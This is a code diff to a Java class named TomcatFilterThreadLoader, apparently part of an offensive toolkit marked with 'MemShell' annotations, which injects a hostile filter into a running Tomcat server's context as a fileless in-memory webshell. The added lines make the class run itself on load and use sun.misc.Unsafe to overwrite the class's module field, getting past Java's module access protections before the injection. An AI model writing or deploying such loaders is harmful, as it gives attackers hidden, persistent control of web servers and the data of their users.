@@ -4,6 +4,7 @@ import com.ppp.annotation.JavaClassModifiable;
 import com.ppp.annotation.JavaClassType;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.Middleware;
+import sun.misc.Unsafe;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
@@ -27,7 +28,9 @@ public class TomcatFilterThreadLoader {
     private static String CLASSNAME;
     private static String PATH;
     private static String NAME;
-
+    static {
+        new TomcatFilterThreadLoader();
+    }
     public TomcatFilterThreadLoader() {
     }
 
@@ -51,6 +54,7 @@ public class TomcatFilterThreadLoader {
      * Tomcat Filter
      */
     public static void inject(Object standardContext) throws Exception {
+        addModule();
         HashMap filterDefs = (HashMap) getFieldValue(standardContext, "filterDefs");
         if (filterDefs.containsKey(NAME)) {
             return;
@@ -241,5 +245,23 @@ public class TomcatFilterThreadLoader {
         }
     }
 
+    public static void addModule() {
+        try {
+            Class unsafeClass = Class.forName("sun.misc.Unsafe");
+            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
+            unsafeField.setAccessible(true);
+            Unsafe unsafe = (Unsafe) unsafeField.get(null);
+            Method method = Class.class.getDeclaredMethod("getModule");
+            method.setAccessible(true);
+            Object module = method.invoke(Object.class);
+            Class cls = TomcatFilterThreadLoader.class;
+            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
+            Method getAndSetObjectMethod = unsafeClass.getMethod("getAndSetObject", Object.class, long.class, Object.class);
+            getAndSetObjectMethod.setAccessible(true);
+            getAndSetObjectMethod.invoke(unsafe, cls, offset, module);
+        } catch (Exception e) {
+
+        }
+    }
 
 }
